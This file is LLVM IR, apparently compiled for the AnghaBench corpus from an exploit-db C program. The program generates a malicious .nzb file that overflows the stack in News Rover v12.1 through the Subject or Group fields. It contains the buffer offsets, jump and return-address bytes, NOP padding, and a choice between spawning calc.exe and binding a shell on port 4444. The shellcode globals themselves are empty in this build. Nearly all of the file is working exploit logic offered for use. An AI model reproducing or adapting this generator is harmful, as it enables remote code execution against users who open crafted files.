; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_3342.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_3342.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [32 x i8] c"[+] NZB exploit for News Rover\0A\00", align 1
@.str.1 = private unnamed_addr constant [64 x i8] c"[+] Coded and discovered by Marsu <Marsupilamipowa@hotmail.fr>\0A\00", align 1
@calcshellcode = common dso_local global i8* null, align 8
@bindshellcode = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [35 x i8] c"[+] Usage: %s type mode file.nzb\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [17 x i8] c"[+] type is ...\0A\00", align 1
@.str.4 = private unnamed_addr constant [73 x i8] c"0: News Rover v12.1,  Rev. 1 Subject stack overflow. Works on XP SP2 FR\0A\00", align 1
@.str.5 = private unnamed_addr constant [72 x i8] c"1: News Rover v12.1,  Rev. 1 Group stack overflow. Works on XP SP2 FR\0A\0A\00", align 1
@.str.6 = private unnamed_addr constant [14 x i8] c"[+] mode is \0A\00", align 1
@.str.7 = private unnamed_addr constant [20 x i8] c"0: Spawns calc.exe\0A\00", align 1
@.str.8 = private unnamed_addr constant [19 x i8] c"1: Binds to 4444\0A\0A\00", align 1
@.str.9 = private unnamed_addr constant [24 x i8] c"[+] Ex: %s 0 0 file.nzb\00", align 1
@.str.10 = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@nzbheader = common dso_local global i8* null, align 8
@.str.11 = private unnamed_addr constant [50 x i8] c"<file poster=\22Poster\22 date=\221170609233\22\0Asubject=\22\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"\EB\15\90\90\00", align 1
@.str.13 = private unnamed_addr constant [5 x i8] c"*\02\FC\7F\00", align 1
@.str.14 = private unnamed_addr constant [98 x i8] c"\22>\0A<groups><group>some group</group></groups>\0A<segments>\0A<segment bytes=\2230\22 number=\221\22>some name\00", align 1
@nzbend = common dso_local global i8* null, align 8
@.str.15 = private unnamed_addr constant [62 x i8] c"<file poster=\22Poster\22 date=\221170609233\22 subject=\22Some Subj\22>\0A\00", align 1
@.str.16 = private unnamed_addr constant [133 x i8] c"<groups><group>alt.bdffs</group></groups>\0A<segments>\0A<segment bytes=\2230\22 number=\221\22>no matter the name</segment>\0A</segments>\0A</file>\00", align 1
@.str.17 = private unnamed_addr constant [64 x i8] c"\0A\0A<file poster=\22Poster\22 date=\221170609233\22 subject=\22Some Subj\22>\0A\00", align 1
@.str.18 = private unnamed_addr constant [16 x i8] c"<groups><group>\00", align 1
@.str.19 = private unnamed_addr constant [18 x i8] c"\90\B83333-\13'33\8B\04\04@\FF\D0\00", align 1
@.str.20 = private unnamed_addr constant [6 x i8] c"S\F1\D1w\00\00", align 1
@.str.21 = private unnamed_addr constant [61 x i8] c"</group></groups>\0A<segments>\0A<segment bytes=\2230\22 number=\221\22>\00", align 1
@.str.22 = private unnamed_addr constant [30 x i8] c"[+] File generated! Have fun\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %9, align 4
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str, i64 0, i64 0))
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.1, i64 0, i64 0))
  %14 = load i32, i32* %4, align 4
  %15 = icmp sgt i32 %14, 3
  br i1 %15, label %16, label %35

16:                                               ; preds = %2
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 1
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 @atoi(i8* %19)
  store i32 %20, i32* %8, align 4
  %21 = load i8**, i8*** %5, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 3
  %23 = load i8*, i8** %22, align 8
  store i8* %23, i8** %10, align 8
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 2
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @atoi(i8* %26)
  store i32 %27, i32* %9, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp ne i32 %28, 0
  br i1 %29, label %32, label %30

30:                                               ; preds = %16
  %31 = load i8*, i8** @calcshellcode, align 8
  store i8* %31, i8** %11, align 8
  br label %34

32:                                               ; preds = %16
  %33 = load i8*, i8** @bindshellcode, align 8
  store i8* %33, i8** %11, align 8
  br label %34

34:                                               ; preds = %32, %30
  br label %50

35:                                               ; preds = %2
  %36 = load i8**, i8*** %5, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 0
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.2, i64 0, i64 0), i8* %38)
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.3, i64 0, i64 0))
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.4, i64 0, i64 0))
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.5, i64 0, i64 0))
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.6, i64 0, i64 0))
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.7, i64 0, i64 0))
  %45 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.8, i64 0, i64 0))
  %46 = load i8**, i8*** %5, align 8
  %47 = getelementptr inbounds i8*, i8** %46, i64 0
  %48 = load i8*, i8** %47, align 8
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.9, i64 0, i64 0), i8* %48)
  store i32 0, i32* %3, align 4
  br label %159

50:                                               ; preds = %34
  %51 = load i8*, i8** %10, align 8
  %52 = call i32* @fopen(i8* %51, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.10, i64 0, i64 0))
  store i32* %52, i32** %6, align 8
  %53 = load i32, i32* %8, align 4
  %54 = icmp eq i32 %53, 0
  br i1 %54, label %55, label %105

55:                                               ; preds = %50
  %56 = load i32*, i32** %6, align 8
  %57 = load i8*, i8** @nzbheader, align 8
  %58 = call i32 @fprintf(i32* %56, i8* %57)
  %59 = load i32*, i32** %6, align 8
  %60 = call i32 @fprintf(i32* %59, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.11, i64 0, i64 0))
  %61 = load i8*, i8** %11, align 8
  %62 = call i32 @strlen(i8* %61)
  %63 = sext i32 %62 to i64
  %64 = add i64 3000, %63
  %65 = trunc i64 %64 to i32
  %66 = call i64 @malloc(i32 %65)
  %67 = inttoptr i64 %66 to i8*
  store i8* %67, i8** %7, align 8
  %68 = load i8*, i8** %7, align 8
  %69 = call i32 @memset(i8* %68, i8 signext 65, i32 3000)
  %70 = load i8*, i8** %7, align 8
  %71 = getelementptr inbounds i8, i8* %70, i64 2022
  %72 = call i32 @memcpy(i8* %71, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0), i32 4)
  %73 = load i8*, i8** %7, align 8
  %74 = getelementptr inbounds i8, i8* %73, i64 2026
  %75 = call i32 @memcpy(i8* %74, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.13, i64 0, i64 0), i32 4)
  %76 = load i8*, i8** %7, align 8
  %77 = getelementptr inbounds i8, i8* %76, i64 2030
  %78 = call i32 @memset(i8* %77, i8 signext -112, i32 15)
  %79 = load i8*, i8** %7, align 8
  %80 = getelementptr inbounds i8, i8* %79, i64 2045
  %81 = load i8*, i8** %11, align 8
  %82 = load i8*, i8** %11, align 8
  %83 = call i32 @strlen(i8* %82)
  %84 = call i32 @memcpy(i8* %80, i8* %81, i32 %83)
  %85 = load i8*, i8** %7, align 8
  %86 = getelementptr inbounds i8, i8* %85, i64 2045
  %87 = load i8*, i8** %11, align 8
  %88 = call i32 @strlen(i8* %87)
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds i8, i8* %86, i64 %89
  %91 = call i32 @memset(i8* %90, i8 signext 0, i32 1)
  %92 = load i8*, i8** %7, align 8
  %93 = getelementptr inbounds i8, i8* %92, i64 3000
  %94 = call i32 @memset(i8* %93, i8 signext 0, i32 1)
  %95 = load i32*, i32** %6, align 8
  %96 = load i8*, i8** %7, align 8
  %97 = call i32 @fprintf(i32* %95, i8* %96)
  %98 = load i32*, i32** %6, align 8
  %99 = call i32 @fprintf(i32* %98, i8* getelementptr inbounds ([98 x i8], [98 x i8]* @.str.14, i64 0, i64 0))
  %100 = load i32*, i32** %6, align 8
  %101 = load i8*, i8** @nzbend, align 8
  %102 = call i32 @fprintf(i32* %100, i8* %101)
  %103 = load i32*, i32** %6, align 8
  %104 = call i32 @fclose(i32* %103)
  br label %157

105:                                              ; preds = %50
  %106 = load i32, i32* %8, align 4
  %107 = icmp eq i32 %106, 1
  br i1 %107, label %108, label %156

108:                                              ; preds = %105
  %109 = load i32*, i32** %6, align 8
  %110 = load i8*, i8** @nzbheader, align 8
  %111 = call i32 @fprintf(i32* %109, i8* %110)
  %112 = load i32*, i32** %6, align 8
  %113 = call i32 @fprintf(i32* %112, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.15, i64 0, i64 0))
  %114 = load i32*, i32** %6, align 8
  %115 = call i32 @fprintf(i32* %114, i8* getelementptr inbounds ([133 x i8], [133 x i8]* @.str.16, i64 0, i64 0))
  %116 = load i32*, i32** %6, align 8
  %117 = call i32 @fprintf(i32* %116, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.17, i64 0, i64 0))
  %118 = load i32*, i32** %6, align 8
  %119 = call i32 @fprintf(i32* %118, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.18, i64 0, i64 0))
  %120 = call i64 @malloc(i32 100)
  %121 = inttoptr i64 %120 to i8*
  store i8* %121, i8** %7, align 8
  %122 = load i8*, i8** %7, align 8
  %123 = call i32 @memset(i8* %122, i8 signext 65, i32 100)
  %124 = load i8*, i8** %7, align 8
  %125 = call i32 @memcpy(i8* %124, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.19, i64 0, i64 0), i32 17)
  %126 = load i8*, i8** %7, align 8
  %127 = getelementptr inbounds i8, i8* %126, i64 94
  %128 = call i32 @memcpy(i8* %127, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.20, i64 0, i64 0), i32 5)
  %129 = load i32*, i32** %6, align 8
  %130 = load i8*, i8** %7, align 8
  %131 = call i32 @fprintf(i32* %129, i8* %130)
  %132 = load i32*, i32** %6, align 8
  %133 = call i32 @fprintf(i32* %132, i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.21, i64 0, i64 0))
  %134 = load i8*, i8** %7, align 8
  %135 = call i64 @realloc(i8* %134, i32 3000)
  %136 = inttoptr i64 %135 to i8*
  store i8* %136, i8** %7, align 8
  %137 = load i8*, i8** %7, align 8
  %138 = call i32 @memset(i8* %137, i8 signext 65, i32 3000)
  %139 = load i8*, i8** %7, align 8
  %140 = getelementptr inbounds i8, i8* %139, i64 1500
  %141 = load i8*, i8** %11, align 8
  %142 = load i8*, i8** %11, align 8
  %143 = call i32 @strlen(i8* %142)
  %144 = call i32 @memcpy(i8* %140, i8* %141, i32 %143)
  %145 = load i8*, i8** %7, align 8
  %146 = getelementptr inbounds i8, i8* %145, i64 3000
  %147 = call i32 @memset(i8* %146, i8 signext 0, i32 1)
  %148 = load i32*, i32** %6, align 8
  %149 = load i8*, i8** %7, align 8
  %150 = call i32 @fprintf(i32* %148, i8* %149)
  %151 = load i32*, i32** %6, align 8
  %152 = load i8*, i8** @nzbend, align 8
  %153 = call i32 @fprintf(i32* %151, i8* %152)
  %154 = load i32*, i32** %6, align 8
  %155 = call i32 @fclose(i32* %154)
  br label %156

156:                                              ; preds = %108, %105
  br label %157

157:                                              ; preds = %156, %55
  %158 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.22, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %159

159:                                              ; preds = %157, %35
  %160 = load i32, i32* %3, align 4
  ret i32 %160
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @fprintf(i32*, i8*) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i64 @realloc(i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
